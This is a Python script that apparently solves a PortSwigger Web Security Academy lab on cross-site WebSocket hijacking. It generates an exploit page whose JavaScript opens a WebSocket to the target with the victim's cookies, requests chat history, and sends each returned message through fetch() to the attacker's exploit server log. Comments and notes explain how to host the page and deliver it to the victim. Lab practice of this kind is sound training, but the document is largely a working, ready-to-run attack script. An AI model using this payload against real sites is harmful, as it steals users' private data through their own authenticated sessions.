"""
Lab 3: Cross-site WebSocket hijacking (CSWSH)
https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab-websocket-hijacking-via-cross-site-websocket-hijacking
Difficulty: Practitioner

📝 No Origin validation on the handshake. Unlike labs 1-2, this is a
browser-delivered exploit (like Clickjacking) — we need the VICTIM's
browser to open the WebSocket connection so it carries their session
cookie automatically. This script generates that exploit-server page.
"""

from utils import log, note

TARGET_HOST = "YOUR-LAB-ID.web-security-academy.net"
WS_PATH = "/chat"
EXFIL_PATH = "/log"  # endpoint on OUR exploit server that receives the stolen data


def build_cswsh_poc():
    return f"""<script>
  var ws = new WebSocket('wss://{TARGET_HOST}{WS_PATH}');

  ws.onopen = function() {{
    // Trigger whatever server action yields sensitive data back over the
    // socket — e.g. requesting chat history. Adjust to match the app's
    // actual expected first message if it's not simply "READY".
    ws.send("READY");
  }};

  ws.onmessage = function(event) {{
    // Exfiltrate whatever comes back (the victim's own chat history, etc.)
    // to our own exploit server, since we don't have direct access to this
    // connection's data otherwise.
    fetch('/{EXFIL_PATH.lstrip("/")}?data=' + encodeURIComponent(event.data));
  }};
</script>"""


def run():
    html = build_cswsh_poc()
    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")

    note("This connects using the VICTIM's browser session (cookies ride")
    note("along automatically on the cross-site WebSocket handshake, since")
    note("the target never checks Origin) — whatever comes back over")
    note("onmessage is exfiltrated to our own exploit server's access log.")
    note(f"Host this on the exploit server (with a simple {EXFIL_PATH} access")
    note("logger, or just check the exploit server's access log directly for")
    note("the ?data= query string), then Deliver to victim.")


if __name__ == "__main__":
    run()
